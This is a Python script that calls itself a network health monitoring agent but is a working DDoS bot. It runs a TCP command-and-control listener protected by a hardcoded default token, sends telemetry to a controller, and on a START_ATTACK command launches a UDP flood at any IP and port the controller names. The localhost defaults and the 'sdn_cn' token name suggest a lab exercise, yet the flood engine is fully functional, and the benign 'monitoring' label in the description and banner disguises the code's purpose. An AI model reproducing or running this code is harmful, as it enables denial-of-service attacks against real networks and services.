import os
import socket
import time
import json
import psutil
import threading
import argparse
from datetime import datetime

# Shared C2 authentication secret
C2_SHARED_SECRET = os.getenv("C2_SECRET_TOKEN", "sdn_cn_c2_token_secret_2026")

class MonitoringAgent:

    def __init__(self, agent_id="Node-1", server_ip="127.0.0.1", telemetry_port=5000, c2_port=5001):
        self.agent_id = agent_id
        self.server_ip = server_ip
        self.telemetry_port = telemetry_port
        self.c2_port = c2_port

        self.running = True
        self.attack_active = False
        self.attack_thread = None
        self.attack_target = None
        self.attack_stats = {"packets_sent": 0, "bytes_sent": 0}

        # Sockets
        self.udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.local_ip = self._get_local_ip()

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.server_ip, self.telemetry_port))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def get_telemetry(self):
        cpu = psutil.cpu_percent(interval=0.1)
        memory = psutil.virtual_memory().percent
        processes = len(psutil.pids())
        net_io = psutil.net_io_counters()

        # Add simulated packet flood overhead if actively attacking
        bytes_sent = net_io.bytes_sent + self.attack_stats["bytes_sent"]
        bytes_recv = net_io.bytes_recv

        status = "ATTACKING" if self.attack_active else "NORMAL"
        if cpu > 80 or memory > 80:
            status = "ALERT"

        return {
            "agent_id": self.agent_id,
            "ip_address": self.local_ip,
            "c2_port": self.c2_port,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "cpu_percent": cpu,
            "memory_percent": memory,
            "processes": processes,
            "bytes_sent": bytes_sent,
            "bytes_recv": bytes_recv,
            "status": status,
            "active_attack": self.attack_active
        }

    def start_telemetry_loop(self):
        print(f"[{self.agent_id}] 📡 Telemetry loop started -> UDP {self.server_ip}:{self.telemetry_port}")
        while self.running:
            try:
                data = self.get_telemetry()
                payload = json.dumps(data).encode('utf-8')
                self.udp_sock.sendto(payload, (self.server_ip, self.telemetry_port))
            except Exception as e:
                print(f"[{self.agent_id}] Telemetry send error: {e}")
            time.sleep(3)

    def start_c2_listener(self):
        c2_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            c2_sock.bind(("0.0.0.0", self.c2_port))
            c2_sock.listen(5)
            print(f"[{self.agent_id}] 🎮 TCP Command & Control (C2) listening on port {self.c2_port}")
        except Exception as e:
            print(f"[{self.agent_id}] Failed to bind C2 socket on port {self.c2_port}: {e}")
            return

        while self.running:
            try:
                conn, addr = c2_sock.accept()
                threading.Thread(target=self._handle_c2_client, args=(conn, addr), daemon=True).start()
            except Exception:
                break

    def _handle_c2_client(self, conn, addr):
        with conn:
            try:
                raw_data = conn.recv(4096)
                if not raw_data:
                    return
                command_data = json.loads(raw_data.decode('utf-8'))

                # Verify C2 authentication token
                received_token = command_data.get("token")
                if received_token != C2_SHARED_SECRET:
                    print(f"[{self.agent_id}] ⛔ Unauthorized C2 request from {addr[0]}:{addr[1]} (invalid or missing token)")
                    conn.sendall(json.dumps({
                        "status": "ERROR",
                        "message": "Unauthorized: Invalid or missing C2 token"
                    }).encode('utf-8'))
                    return

                cmd = command_data.get("command")

                if cmd == "START_ATTACK":
                    target_ip = command_data.get("target_ip", self.server_ip)
                    target_port = command_data.get("target_port", 8080)
                    duration = command_data.get("duration", 15)
                    packet_size = command_data.get("packet_size", 1024)

                    response = self.trigger_attack(target_ip, target_port, duration, packet_size)
                    conn.sendall(json.dumps(response).encode('utf-8'))

                elif cmd == "STOP_ATTACK":
                    self.attack_active = False
                    conn.sendall(json.dumps({
                        "status": "SUCCESS",
                        "message": f"Attack stopped on {self.agent_id}"
                    }).encode('utf-8'))

                elif cmd == "STATUS":
                    conn.sendall(json.dumps({
                        "status": "SUCCESS",
                        "telemetry": self.get_telemetry()
                    }).encode('utf-8'))

                else:
                    conn.sendall(json.dumps({"status": "ERROR", "message": "Unknown Command"}).encode('utf-8'))

            except Exception as e:
                conn.sendall(json.dumps({"status": "ERROR", "message": str(e)}).encode('utf-8'))

    def trigger_attack(self, target_ip, target_port, duration=15, packet_size=1024):
        if self.attack_active:
            return {"status": "WARNING", "message": "Attack is already running"}

        self.attack_active = True
        self.attack_target = (target_ip, target_port)
        self.attack_thread = threading.Thread(
            target=self._ddos_flood_engine,
            args=(target_ip, target_port, duration, packet_size),
            daemon=True
        )
        self.attack_thread.start()
        
        print(f"[{self.agent_id}] 💣 DDoS Flood Attack started against {target_ip}:{target_port} for {duration}s")
        return {
            "status": "SUCCESS",
            "message": f"DDoS Flood Attack initiated on {target_ip}:{target_port} for {duration} seconds",
            "agent_id": self.agent_id
        }

    def _ddos_flood_engine(self, target_ip, target_port, duration, packet_size):
        flood_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"X" * packet_size
        end_time = time.time() + duration

        while time.time() < end_time and self.attack_active:
            try:
                # High frequency UDP packet burst
                for _ in range(50):
                    flood_sock.sendto(payload, (target_ip, target_port))
                    self.attack_stats["packets_sent"] += 1
                    self.attack_stats["bytes_sent"] += packet_size
                time.sleep(0.01)
            except Exception:
                break

        self.attack_active = False
        flood_sock.close()
        print(f"[{self.agent_id}] 🛑 Attack cycle completed. Total flood bytes: {self.attack_stats['bytes_sent']}")

    def run(self):
        print("========================================")
        print(f"   NETWORK MONITORING AGENT: {self.agent_id}")
        print("========================================")
        print(f"Target Server IP: {self.server_ip}:{self.telemetry_port}")
        print(f"C2 Listener Port: {self.c2_port}")
        print("========================================\n")

        # Launch Telemetry & C2 Threads
        t_telemetry = threading.Thread(target=self.start_telemetry_loop, daemon=True)
        t_c2 = threading.Thread(target=self.start_c2_listener, daemon=True)

        t_telemetry.start()
        t_c2.start()

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n[{self.agent_id}] Shutting down agent...")
            self.running = False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Network Health Monitoring Agent")
    parser.add_argument("--agent-id", default="Node-1", help="Agent Node Identifier")
    parser.add_argument("--server-ip", default="127.0.0.1", help="Central Server IP")
    parser.add_argument("--telemetry-port", type=int, default=5000, help="UDP Telemetry Port")
    parser.add_argument("--c2-port", type=int, default=5001, help="TCP Command & Control Port")
    args = parser.parse_args()

    agent = MonitoringAgent(
        agent_id=args.agent_id,
        server_ip=args.server_ip,
        telemetry_port=args.telemetry_port,
        c2_port=args.c2_port
    )
    agent.run()
